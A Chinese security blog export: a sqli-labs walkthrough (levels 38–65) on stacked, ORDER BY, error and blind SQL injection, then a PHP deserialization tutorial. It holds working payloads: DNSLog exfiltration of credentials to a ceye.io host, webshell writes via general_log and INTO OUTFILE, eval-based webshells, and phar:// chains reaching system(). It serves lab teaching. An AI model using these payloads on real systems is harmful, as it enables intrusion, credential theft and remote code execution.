各个数据库堆叠查询实例MySQL 1select * from users where id=1;select version(); SQL Server 1select 1,2,3;select * from test; Postgresql 1select * from user_test;select 1,2,3; 注入天书里面说 Oracle 不支持堆叠查询，这个国光我对 Oracle 不熟悉，以后接触到了国光再亲自尝试看看。 Less-38 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注、堆叠注入 id=&#39;$id&#39; 又到了简单源码分析的时间了，来看看堆叠注入的代码是如何实现的： 1234567# id 参数直接带入到 SQL 语句中$id=$_GET['id'];$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";if (mysqli_multi_query($con1, $sql)): 输出查询信息else: print_r(mysqli_error($con1)); 发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的： 12$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";$result=mysql_query($sql); 变成了现在的： 12$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";if (mysqli_multi_query($con1, $sql)) mysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。 既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用： 添加字段值 1?id=1&apos;;insert into users(username,password) values (&apos;hello&apos;,&apos;world&apos;); 数据库中查看是否添加成功： 123456mysql&gt; select * from users where username = 'hello';+----+----------+----------+| id | username | password |+----+----------+----------+| 23 | hello | world |+----+----------+----------+ 但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来国光演示我认为比较实用的姿势。 DNSLog 数据外带需要条件： MySQL 开启 load_file() DNSLog 平台 （Hyuga、CEYE） Windows 平台 load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。 其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式 1\\192.168.31.53\test\ CONCAT() 函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用 UNC 路径。 因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。 下面国光临时使用 Windows 下的 PHPStudy 来搭建 sqli-labs 测试环境： 1?id=1&apos;;select load_file(concat(&apos;\\\\&apos;,(select hex(concat_ws(&apos;~&apos;,username,password)) from users limit 0,1),&apos;.gvc791.ceye.io\\abc&apos;))--+ Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。 手动 Hex 解码即可 开启日志 Getshell需要条件： Web 的物理路径 MySQL 可以读写 Web 目录 Windows 成功率 高于 Linux 首先查看当前的日志的相关配置： 1234567mysql&gt; SHOW VARIABLES LIKE 'general%';+------------------+---------------------------------+| Variable_name | Value |+------------------+---------------------------------+| general_log | OFF || general_log_file | /var/lib/mysql/bb198f1a9cc6.log |+------------------+---------------------------------+ Docker 里面的这个 Ubuntu 环境默认是没有开启的，这里尝试注入的时候手动开启： 1?id=1&apos;;set global general_log = &quot;ON&quot;;set global general_log_file=&apos;/var/www/html/shell.php&apos;;--+ 然后 MySQL 再查看日志配置是否被修改了： 1234567mysql&gt; SHOW VARIABLES LIKE 'general%';+------------------+-------------------------+| Variable_name | Value |+------------------+-------------------------+| general_log | ON || general_log_file | /var/www/html/shell.php |+------------------+-------------------------+ 这个尝试 getshell： 1?id=1';select &lt;?php phpinfo();?&gt; 日志里面就会记录&lt;?php phpinfo();?&gt;，浏览器访问查看： 查看一下当的日志文件： 1234$ cat /var/www/html/shell.php200517 8:47:04 10 Connect root@localhost on security 10 Init DB security 10 Query SELECT * FROM users WHERE id='1';select '&lt;?php phpinfo();?&gt;'-- ' LIMIT 0,1 此时已经成功写入了，但是因为这个文件属于 mysql 用户组的，国光我测试并没有成功执行： 12$ ls -l /var/www/html/shell.php-rw-rw---- 1 mysql mysql 171 May 17 08:47 /var/www/html/shell.php 不过在 Windows 下 phpstudy 测试是可以很成功的 getshell 的，如果有师傅补充的话 欢迎评论区留言！ Less-39 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注、堆叠注入 id=$id 和 Less-38 相比没有啥区别，只是拼接方式不一样。 Less-40 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注、堆叠注入 id=(&#39;$id&#39;) 和 Less-38 相比只是拼接方式不一样。 但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。 Less-41 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注、堆叠注入 id=$id 和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，国光这里不再赘述。 Less-42 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注、堆叠注入 username=&#39;$username&#39; index.php 没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。 forgot_password.php if you forgot your password,go to hack it acc-create.php if you need to create account,then hack your way in failed.php Bug off you silly dump hacker login.php 12345678910111213141516# username 被过滤 ' " \ password 没有被$username = mysqli_real_escape_string($con1, $_POST["login_user"]);$password = $_POST["login_password"];# 堆叠查询$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";mysqli_multi_query($con1, $sql))if 查询成功： return $row[1];else: print_r(mysqli_error($con1));if 登录成功: setcookie("Auth", 1, time()+3600); 跳转到 logged-in.php logged-in.php 登录成功，提供修改密码的表单 1&lt;form name="mylogin" method="POST" action="pass_change.php"&gt; pass_change.php 1234567891011if 没有登录: 重定向到 index.phpif 提交了修改密码表单: $username= $_SESSION["username"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); if $pass==$re_pass: $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "; 这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。 经典的万能密码绕过 1&#39; or 1#: 1234POST /Less-42/login.php HTTP/1.1...login_user=admin&amp;login_password=1' or 1#&amp;mysubmit=Login 因为登录成功后返回： 1return $row[1]; 所以登录了 id 为 1 的 Dumb 用户： 尝试联合查询: 1234POST /Less-42/login.php HTTP/1.1...login_user=admin&amp;login_password=1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit=Login 报错注入： 1login_user=admin&amp;login_password=1&apos; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;mysubmit=Login 同理这里也可以进行盲注和堆叠查注入，国光这里不再赘述。 Less-43 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注、堆叠注入 username=(&#39;$username&#39;) 和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。 Less-44 请求方式 注入类型 拼接方式 POST 联合、布尔盲注、延时盲注、堆叠注入 username=&#39;$username&#39; 和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。 Less-45 请求方式 注入类型 拼接方式 POST 联合、布尔盲注、延时盲注、堆叠注入 username=(&#39;$username&#39;) 与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。 Less-46 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 ORDER BY $id 12345678910# GET 方式获取 sort 参数$id=$_GET['sort'];# 直接将 id 带入 SQL 中$sql = "SELECT * FROM users ORDER BY $id";if 查询成功： 输出查询信息else： print_r(mysql_error()); order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。 验证方式 升序和降序验证 12345# 升序排序?sort=1 asc# 降序排序?sort=1 dasc rand() 验证 rand(ture) 和 rand(false) 的结果是不一样的 12?sort=rand(true)?sort=rand(false) 所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload 此外 rand() 结果是一直都是随机的 12?sort=rand()?sort=1 and rand() 延时验证 123?sort=sleep(1)?sort=(sleep(1))?sort=1 and sleep(1) 这种方式均可以延时，延时的时间为 (行数*1) 秒 报错注入11?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a) 报错注入2利用 procedure analyse 参数，也可以执行报错注入。 12?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&apos;:&apos;,username,password)+FROM+users limit 0,1))),1) 布尔盲注数据库第 1 位为：s 12?sort=rand(left(database(),1)&gt;&apos;r&apos;)?sort=rand(left(database(),1)&gt;&apos;s&apos;) 延时盲注数据库第一个字母的 ascii 码为 115，即s 12?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort=rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1))) into outfile将查询结果导入到文件中： 1?sort=1 into outfile "/var/www/html/less46.txt" 如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。 访问验证是否有信息： 1234567891011121314$ curl http://127.0.0.1:8888/less46.txt1 Dumb Dumb2 Angelina I-kill-you3 Dummy p@ssword4 secure crappy5 stupid stupidity6 superman genious7 batman mob!le8 admin admin9 admin1 admin110 admin2 admin211 admin3 admin312 dhakkan dumbo14 admin4 admin4 利用导出文件 getshell： 注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell： 1?sort=1 into outfile &quot;/var/www/html/less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e 3c3f70687020706870696e666f28293b3f3e 是 &lt;php phpinfo();&gt; 的十六进制编码。 来查看下写入的文件内容是啥样子的： 12$ cat /var/www/html/less46.php1 Dumb Dumb&lt;?php phpinfo();?&gt;2 Angelina I-kill-you&lt;?php phpinfo();?&gt;3 Dummy p@ssword&lt;?php phpinfo();?&gt;4 secure crappy&lt;?php phpinfo();?&gt;5 stupid stupidity&lt;?php phpinfo();?&gt;6 superman genious&lt;?php phpinfo();?&gt;7 batman mob!le&lt;?php phpinfo();?&gt;8 admin admin&lt;?php phpinfo();?&gt;9 admin1 admin1&lt;?php phpinfo();?&gt;10 admin2 admin2&lt;?php phpinfo();?&gt;11 admin3 admin3&lt;?php phpinfo();?&gt;12 dhakkan dumbo&lt;?php phpinfo();?&gt;14 admin4 admin4&lt;?php phpinfo();?&gt; 浏览器访问测试看看： Less-47 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 ORDER BY &#39;$id&#39; 和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。 Less-48 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 ORDER BY $id 和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。 Less-49 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 ORDER BY &#39;$id&#39; 和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。 Less-50 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注、堆叠注入 ORDER BY $id 和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话国光这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。 Less-51 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注、堆叠注入 ORDER BY &#39;$id&#39; 和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。 Less-52 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注、堆叠注入 ORDER BY $id 和 Less-50 是一样的，只是少了报错注入的利用方式。 Less-53 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注、堆叠注入 ORDER BY &#39;$id&#39; 和 Less-51 是一样的，只是少了报错注入的利用方式。 进阶挑战 54-65 关Less-54 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=&#39;$id&#39; 简单源码分析： 123456789101112131415161718192021222324if reset: # 根据时间戳生成 cookie setcookie('challenge', ' ', time() - 3600000);else: if cookie 中有 challenge: $sessid=$_COOKIE['challenge']; else: # 生成 cookie $expire = time()+60*60*24*30; $hash = data($table,$col); setcookie("challenge", $hash, $expire); if $_GET['id']: 计数器 + 1 $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"; if 有查询成功: 输出查询信息 else： 啥都不输出# key 被双重过滤了$key = addslashes($_POST['key']);$key = mysql_real_escape_string($key);$sql="SELECT 1 FROM $table WHERE $col1= '$key'"; 代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧： 判断闭合方式 1?id=1&apos;--+ 判断字段数 12?id=1&apos; order by 3--+?id=1&apos; order by 4--+ 查询有可注入的字段 1?id=-1&apos; union select 1,2,3 --+ 字段数 2,3 查询表名** 1?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()) --+ 表名为：KMA0E2Z29V ，这个表名可能是随机的 不同用户不一样 查询列名 1?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x4b4d413045325a323956)--+ 查到列名如下：id、sessid、secret_1XVB、tryy 查询字段值 1?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(secret_1XVB)+FROM+KMA0E2Z29V)--+ 拿到 key 值为：UNK985xGrJL5PIWKGogHXo3F 总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。 Less-55 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=($id) Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，国光这里不再赘述。 Less-56 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=(&#39;$id&#39;) 和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54 Less-57 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=&quot;$id&quot; 和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54 Less-58 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=&#39;$id&#39; Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下： 1234$unames=array("Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4");$pass = ($unames);echo 'Your Login name : '. $unames[$row['id']];echo 'Your Password : ' .$pass[$row['id']]; 因为这里输出只输出 $unames 和 $pass 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出： 1print_r(mysql_error()); 所以这里就可以进行报错注入，下面直接丢 payload 吧： 1?id=1&apos;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ 这里国光注入的表名为：WOO6ID239T，列名为：secret_OD68 Less-59 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=$id 与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58 Less-60 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=（&quot;$id&quot;） 与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58 Less-61 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=((&#39;$id&#39;)) 与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58 Less-62 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=(&#39;$id&#39;) 此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，这是一个大工程，在实战工程中还是靠 sqlmap 这种自动化注入神器了，手工注入的话岂不是得天荒地老。 Less-63 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=&#39;$id&#39; 与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62 Less-64 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=(($id)) 与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62 Less-65 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=(&quot;$id&quot;) 与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反序列化漏洞]]></title>
    <url>%2F%2F2020%2F08%2Ffd61bb58.html</url>
    <content type="text"><![CDATA[反序列化漏洞面向对象、类、对象面向对象程序设计（英语：Object-orientedprogramming，缩写：OOP）是种具有对象概念的程序编程典范，同时也是一种程序开发的抽象方针。 类（英语：class）在面向对象编程中是一种面向对象计算机编程语言的构造，是创建对象的蓝图，描述了所创建的对象共同的属性和方法。 在面向对象（ObjectOriented）的软件中，对象（Object）是某一个类（Class）的实例（Instance） 类实例化 → 对象 ， 对象抽象化 → 类 什么是序列化与反序列化序列化给我们传递对象提供了一种简单的方法。把一个对象转换为字节序列，但并不是类型转换，目的是将该字符串存储在本地。相反的行为称为反序列化。 序列化和反序列化的目的是使得程序间传输对象会更加方便 PHP反序列化漏洞PHP中的相关函数 serialize()将一个对象转换成一个字符串。unserialize()将字符串还原为一个对象 serialize()当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下； 12345678&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 创建了一个新的对象，并且将其序列化后的结果打印出来： 1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125; 这里的O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。&quot;chybeta&quot;表示对象的名称。1表示有一个值。{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度，&quot;test&quot;为字符串的名称，之后的类似。 unserialize()与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。 123456789&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_ser);?&gt; 当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。反序列化之前要把类定义好 MagicmethodsPHP中把以两个下划线__开头的方法称为魔术方法(Magicmethods) 12345678910111213141516171819202122232425262728293031__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，用静态方式中调用一个不可访问方法时调用__get()，获得一个类的成员变量时调用__set()，设置一个类的成员变量时调用__isset()，当对不可访问属性调用isset()或empty()时调用__unset()，当对不可访问属性调用unset()时被调用。__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，调用函数的方式调用一个对象时的回应方法__set_state()，调用var_export()导出类时，此静态方法会被调用。__clone()，当对象复制完成时调用__autoload()，尝试加载未定义的类__debugInfo()，打印所需调试信息 主要魔术方法__construct构造函数，PHP5允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __toString打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。 __destruct析构函数，PHP5引入了析构函数的概念，这类似于其它面向对象的语言，如C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __sleep该在一个对象被序列化的时候调用。 __wakeup该方法在一个对象被反序列化的时候调用。 调用点– phar://当程序中没有直接的 unserialize 函数调用的时候，我们应该如何做呢？ 先查看有没有文件写入点（文件上传等等）。 再查找程序中有没有可控的文件操作点：file_get_contents、unlink、file_exists 等等。 Phar 的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是该攻击手法最核心的地方。 根据原程序中的类以及相应的调用链，生成一个带有反序列化数据的 phar。 上传 phar 文件，并使用文件操作点和 phar:// 协议去读取他，触发反序列化。 Magic methods 实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpclass magic_test&#123; public $data1 = "dbapp1"; public $data2 = "dbapp2"; public function print_data() &#123; echo $this-&gt;data1.$this-&gt;data2."\n"; &#125; public function __construct() &#123; echo "__construct\n"; &#125; public function __destruct() &#123; echo "__destruct\n"; &#125; public function __wakeup() &#123; echo "__wakeup\n"; &#125; public function __sleep() &#123; echo "__sleep\n"; return array("data1", "data2"); //思考 &#125;&#125;echo "准备创建对象\n";$obj = new magic_test();echo "对象创建完成\n";echo "准备序列化对象\n";$serialized = serialize($obj);echo "序列化对象完成\n";echo "准备序列化后的对象\n";echo "Serialized: ".$serialized."\n";echo "序列化对象完成\n";echo "准备反序列化对象\n";$obj2 = unserialize($serialized); //把对象存到obj2里面echo "反序列化完成\n";echo "准备调用方法\n";$obj2-&gt;print_data();echo "调用方法结束\n";echo "脚本运行结束\n"; 运行结果： PHP反序列化漏洞PHP反序列化漏洞又叫PHP对象注入漏洞，反序列化的数据本质上来说是没有危害的，但是在反序列化参数可控时，可能会产生严重的安全威胁。当传给unserialize()的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 PHP反序列化漏洞实例Magicmethods-__wakeup 实例1代码： 1234567891011&lt;?phpclass flag&#123; public $cmd = 'ls'; function __wakeup() &#123; system($this-&gt;cmd); &#125;&#125;unserialize($_POST['pop']);highlight_file(__FILE__); exp: 12345678910111213&lt;?phpclass flag&#123; public $cmd = 'ls'; function __wakeup() &#123; system($this-&gt;cmd); &#125;&#125;$flag = new flag();$flag-&gt;cmd = 'whoami';echo serialize($flag); 生成的序列化文本: 1O:4:"flag":1:&#123;s:3:"cmd";s:6:"whoami";&#125; 通过对象被反序列化后调用wake up魔术方法，触发system命令执行 Magicmethods-__wakeup 实例2代码： 123456789101112131415&lt;?phpclass flag&#123; public $filename = '1.txt'; public $content = 'hello'; public function __wakeup() &#123; $this-&gt;save(); &#125; public function save() &#123; file_put_contents($this-&gt;filename, $this-&gt;content); &#125;&#125;unserialize($_POST['pop']);highlight_file(__FILE__); exp: 1234567891011121314151617181920&lt;?phpclass flag&#123; public $filename = '1.txt'; public $content = 'hello'; public function __wakeup() &#123; $this-&gt;save(); &#125; public function save() &#123; file_put_contents($this-&gt;filename, $this-&gt;content); &#125;&#125;$flag = new flag(); //生成对象赋值到变量里面$flag-&gt;filename = '1.php';$flag-&gt;content = '&lt;?php eval($_POST[a]); ?&gt;';echo serialize($flag);//序列号操作 生成的序列化文本: 1O:4:&quot;flag&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;s:7:&quot;content&quot;;s:25:&quot;&lt;?php eval($_POST[a]); ?&gt;&quot;;&#125; Magicmethods-__tostring代码： 12345678910111213141516&lt;?phpclass flag&#123; public $filename = '1.txt'; public function __toString() &#123; if(isset($this-&gt;filename)) &#123; echo file_get_contents($this-&gt;filename)."\n"; &#125; return "great!"; &#125;&#125;$flag = unserialize($_POST['pop']);echo $flag;highlight_file(__FILE__); exp: 12345678910111213141516&lt;?phpclass flag&#123; public $filename = '1.txt'; public function __toString() &#123; if(isset($this-&gt;filename)) &#123; echo file_get_contents($this-&gt;filename)."\n"; &#125; return "great!"; &#125;&#125;$flag = new flag();$flag-&gt;filename = '/etc/passwd';echo serialize($flag); 生成的序列化文本: 1O:4:"flag":1:&#123;s:8:"filename";s:11:"/etc/passwd";&#125; 其他成员action的调用链代码： 12345678910111213141516171819202122232425&lt;?phpclass flag &#123; public $obj; function __construct() &#123; $this-&gt;obj = new flag2(); //把obj属性赋值给flag2这个定义对象 &#125; function __destruct() &#123; $this-&gt;obj-&gt;action(); //调用属性 &#125;&#125;class flag2 &#123; function action() &#123; echo 'flag2-&gt;action()'; //直接返回字符串 &#125;&#125;class flag3 &#123; public $cmd; function action() &#123; system($this-&gt;cmd); //高危函数system的参数就是cmd的属性 &#125;&#125;unserialize($_POST['pop']);highlight_file(__FILE__); exp: 123456789101112131415161718192021222324252627&lt;?phpclass flag &#123; public $obj; function __construct() &#123; $this-&gt;obj = new flag2(); &#125; function __destruct() &#123; $this-&gt;obj-&gt;action(); &#125;&#125;class flag2 &#123; function action() &#123; echo 'flag2-&gt;action()'; &#125;&#125;class flag3 &#123; public $cmd; function action() &#123; system($this-&gt;cmd); &#125;&#125;$flag = new flag();$flag-&gt;obj = new flag3(); //把flag的类对象 传给flag3$flag-&gt;obj-&gt;cmd = "whoami"; //访问flag3的类对象echo serialize($flag); 这里只有flag有魔术方法，而有高危函数的flag3只有action不能调用，所以需要把flag的类对象传给flag3，这样魔术方法不需要主动调用，从而命令执行 生成的序列化文本： 1O:4:&quot;flag&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;flag3&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&#125; 调用点- phar:// 触发命令执行1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phphighlight_file(__FILE__);class A &#123; public $a; public function __construct($a) &#123; $this-&gt;a = $a; &#125; public function __destruct() &#123; echo "DASCTF".$this-&gt;a; &#125;&#125;class B &#123; public $b; public function __construct($b) &#123; $this-&gt;b = $b; &#125; public function __toString() &#123; return eval($this-&gt;b); //类的对象被当成字符串处理时就会被调用 &#125;&#125;if(isset($_FILES['file'])) &#123; @mkdir("/tmp/upload"); $uuid = uniqid(); $ext = explode(".", $_FILES["file"]["name"]); $ext = end($ext); move_uploaded_file($_FILES['file']['tmp_name'], "/tmp/upload/".$uuid.".".$ext); //把临时上传文件传到/tmp/upload下 echo "Upload Success! FilePath: /tmp/upload/".$uuid.".".$ext;&#125;if(isset($_GET['file'])) &#123; if(strstr($_GET['file'], "flag")) &#123; die("Get out!"); &#125; echo file_get_contents($_GET['file']);&#125;?&gt; 先想办法序列化中a的对象，然后让其反序列化exp: 123456789101112131415161718192021222324252627282930313233&lt;?phpclass A &#123; public $a; public function __construct($a) &#123; $this-&gt;a = $a; &#125; public function __destruct() &#123; echo "DASCTF".$this-&gt;a; &#125;&#125;class B &#123; public $b; public function __construct($b) &#123; $this-&gt;b = $b; &#125; public function __toString() &#123; return eval($this-&gt;b); &#125;&#125;$phar = new Phar("phar.phar");$phar -&gt; startBuffering();$phar -&gt; setStub("&lt;?php __HALT_COMPILER();?&gt;"); // 标志着需要PHP反序列化$b = new B('system($_GET[a]);');$o = new A($b);$phar -&gt; setMetadata($o);$phar -&gt; addFromString("test.txt","test");$phar -&gt; stopBuffering(); 运行后会生成了phar.phar 上传phar后用伪协议生成payload： 1http://127.0.0.1:8891/S10.php?file=phar:///tmp/upload/5f2ba8ae709a9.phar/test.txt 反序列化了a对象，并且把a的值变成了DASCTF 接下来就要用反序列化a来调用对象b中的魔术方法，从而调用对象b中的高危函数eval 上传phar后生成payload 1http://127.0.0.1:8891/S10.php?file=phar:///tmp/upload/5f2baa1fe102c.phar/test.txt&amp;a=whoami 反序列化攻击一定要想清楚调用链 ThinkPHP V5.0.24反序列化漏洞代码包：https://wws.lanzous.com/ij0LMfcld0b ThinkPHP 5.0.24 反序列化RCE （Windows下EXP）转载：https://www.cnblogs.com/xiaozhiru/p/12452528.html 运行POC后会生成payload： 